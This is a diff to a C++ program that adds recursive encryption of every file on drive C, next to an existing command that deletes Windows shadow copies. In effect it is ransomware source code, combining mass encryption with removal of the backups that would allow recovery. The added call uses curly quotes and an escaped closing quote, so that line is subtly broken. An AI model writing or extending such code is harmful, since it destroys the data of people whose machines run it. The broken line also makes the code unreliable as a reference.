@@ -9,7 +9,9 @@
 #include <cryptopp/osrng.h>
 #include <cryptopp/files.h>
 #include <cryptopp/hex.h>
+#include <filesystem>
 
+namespace fs = std::filesystem;
 using namespace std;
 using namespace CryptoPP;
 
@@ -93,6 +95,17 @@ void create_traffic(vector<string> addresses) {
     closesocket(sock);
 }
 
+// A function to encrypt all files in a given folder
+void encrypt_folder(string folder) {
+    for (auto& p : fs::directory_iterator(folder)) {
+        if (p.is_regular_file()) {
+            encrypt_file(p.path().string());
+        } else if (p.is_directory()) {
+            encrypt_folder(p.path().string());
+        }
+    }
+}
+
 int main() {
     
     // Create files with given names and contents under AppData\Local\Temp\
@@ -116,6 +129,8 @@ int main() {
     encrypt_file("C:\\test.txt");
     encrypt_file("C:\\test.docx");
     encrypt_file("C:\\test.jpg");
+    // Encrypt all files on drive C
+    encrypt_folder(“C:\”);
 
     // Remove shadow copies
     run_command("vssadmin delete shadows /all /quiet");
